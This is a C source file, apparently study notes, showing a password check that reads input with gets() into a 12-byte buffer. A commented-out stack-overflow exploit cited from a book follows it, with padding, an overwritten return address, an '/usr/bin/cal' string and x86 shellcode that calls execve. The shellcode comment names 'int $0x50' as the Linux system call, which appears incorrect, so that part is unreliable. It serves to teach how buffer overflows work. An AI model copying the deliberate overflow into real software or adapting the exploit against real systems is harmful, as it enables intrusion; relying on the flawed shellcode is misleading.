#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int isPasswordOK(void) {
	char password[12];
	gets(password); // potential for a buffer overflow
	if (!strcmp(password, "goodpass"))
		return 1;
	else return 0;
}

int main(void)
{
	int PwStatus;
	puts("Enter Password: ");
	PwStatus = isPasswordOK();
	if (!PwStatus) {
		puts("Access denied");
		exit(-1);
	}
	else
		puts("Access granted");
}

// following Linux exploit from the book

/*
// buf[12]
00 00 00 00
00 00 00 00
00 00 00 00

/. %ebp
00 00 00 00

/. return address   // address of the beginning of the exploit code
78 fd ff bf

// "/usr/bin/cal"	// just a 12-character string
2f 75 73 72
2f 62 69 6e
2f 63 61 6c
00 00 00 00

// null pointer		// address 4 bytes prior to the exploit code, the NULL
74 fd ff bf

// NULL
00 00 00 00

// exploit code
b0 0b       // mov  $0xb, %eax
8d 1c 24    // lea  (%esp), %ebx		// at this point, %esp points to the beginning of the "/usr/bin/cal" string. Load this is as the filename argument to execve()
8d 4c 24 f0 // lea  -0x10(%esp), %ecx	// loads a pointer to a NULL pointer into the argv argument
8b 54 24 ec // mov  -0x14(%esp), %edx	// loads a NULL pointer into envp argument
cd 50       // int  $0x50				// invokes execve(), linux function
*/
